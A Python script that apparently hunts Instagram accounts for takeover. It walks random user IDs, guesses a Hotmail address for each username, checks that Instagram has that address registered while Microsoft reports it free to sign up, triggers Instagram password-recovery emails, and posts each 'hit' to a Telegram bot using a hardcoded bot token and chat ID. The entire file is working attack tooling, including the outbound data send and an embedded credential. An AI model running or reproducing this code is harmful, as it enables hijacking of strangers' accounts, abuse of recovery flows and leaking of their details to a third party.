import os
try:
  from rich.console import Console
  from rich.live import Live
except:
  os.system("pip install rich")
  from rich.console import Console
  from rich.live import Live
try:
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
try:
  from time import time
except:
  os.system("pip install time")
  from time import time
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from uuid import uuid4
except:
  os.system("pip install uuid")
  from uuid import uuid4
try:
  from random import randrange
except:
  os.system("pip install random")
  from random import randrange
hits=0
bads_instgram=0
bads_email=0
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
ID = "5195444280"
token = "6737562665:AAH1NBn84h2s64LFucbMWKq7oRMzq4MHybI"
ids=[]
def get_id():
  id=str(randrange(10000, 30975110))
  if id not in ids:
    ids.append(id)
    return id
  else:
    get_id()
os.system('clear')
def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='h h h'
  return r
def info(username,jj):
  global hits
  url = 'http://www.bradychrist.top/api/v7/user'
  he = {
  'Host': 'www.bradychrist.top',
  'Connection': 'keep-alive',
  'Content-Length': '13',
  'package': 'ins.bradychrist.com',
  'apptype': 'android',
  'User-Agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.211 Mobile Safari/537.36',
   'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
     'idfa': '93f87de7-a83b-4098-a8a7-6801539c5f6a',
     'Accept': 'application/json, text/plain, */*',
     'pk': '',
     'username': '',
     'version': '1.0',
     'Origin': 'http://www.bradychrist.top',
     'X-Requested-With': 'ins.bradychrist.com',
     'Referer': 'http://www.bradychrist.top/h5_v12/',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en-US;q=0.7,en;q=0.6',
  } 
  da=(f'username={username}')
  hits+=1

  try:
    zaid=requests.post(url,headers=he,data=da).json()['data']
    id=zaid['userPk']
    date=requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()['date']
    fs=zaid['followerNum']
    fg=zaid['followingNum']
    postsNum=zaid['postsNum']
    tlg = f'''
⌯ Found New Account 
⌘━━━━━━━━━━━⌘ 
folowers ➥ {fs}
following ➥{fg}
postsNum ➥ {postsNum}
username ➥ {username}
email ➥ {username}@{jj}
date ➥ {date}
id ➥ {id}
rest ➥ {rest(username)}
⌘━━━━━━━━━━━⌘ 
telegram :- @Haxkx
'''
    print(BLUE+tlg)
    with open('hits1.txt','a') as ff:
      ff.write(f'{tlg}\n')
    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
  except:
    tlg = f'''
        
    ⌘━━━━━━━━━━━⌘ 
    username ➥ {username}
    email ➥ {username}@{jj}
    rest ➥ {rest(username)}
    ⌘━━━━━━━━━━━⌘ 
    telegram :- @toxic_tanji
    '''
    print(BLUE+tlg)
    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
    with open('hits1.txt','a') as ff:
      ff.write(f'{tlg}\n')
def Qredes(email):
  global bads_email
  try:
    r=requests.post('https://signup.live.com',headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',})
    mc=r.cookies.get_dict()['amsc']
    ca=str.encode(r.text.split('Canary')[4].split('","ip":"')[0].split('":"')[1]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
    cookies = {
      'amsc':mc,

    }
    headers = {
      'authority': 'signup.live.com',
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9',
      'canary': ca,
      'user-agent': 'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/122.0.0.0',
    }

    json_data = {
      'signInName': email,
    }
    response = requests.post(
      'https://signup.live.com/API/CheckAvailableSigninNames',
      cookies=cookies,
      headers=headers,
      json=json_data,
    ).text
    if 'isAvailable' in response:
        username,jj=email.split('@')
        info(username,jj)
    else:bads_email+=1
  except:Qredes(email)
def check(email):
  global bads_instgram
  try:
    csrftoken = md5(str(time()).encode()).hexdigest()
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/signup/email/',
        'user-agent': generate_user_agent(),
        'x-csrftoken': csrftoken
    }

    data = {
        'email': email,
    }

    response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
    if 'email_is_taken' in str(response.text):
      Qredes(email)
    else:
      bads_instgram+=1
  except:
    check(email)


console = Console()

with Live(console=console) as live:
  while True:
    tt=(f"\r[green]Hits:[/green] {hits} [red]Bad instgram:[/red] {bads_instgram} [yellow]Email Not Available:[/yellow] {bads_email}")
    live.update(tt)
    id=get_id()
    csrftoken = md5(str(time()).encode()).hexdigest()
    headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'dpr': '0.8',
    'origin': 'https://www.instagram.com',
    'user-agent': generate_user_agent(),
    'x-csrftoken': csrftoken,
    }
    data = {
    '__spin_b': 'trunk',
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
    'variables': '{"userID":"'+id+'","username":"0s9s"}',
    'server_timestamps': 'true',
    'doc_id': '7666785636679494',
    }
    response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data).json()
    try:
      username=response['data']['user']['username']
      email = username + '@hotmail.com'
      check(email)
    except:''
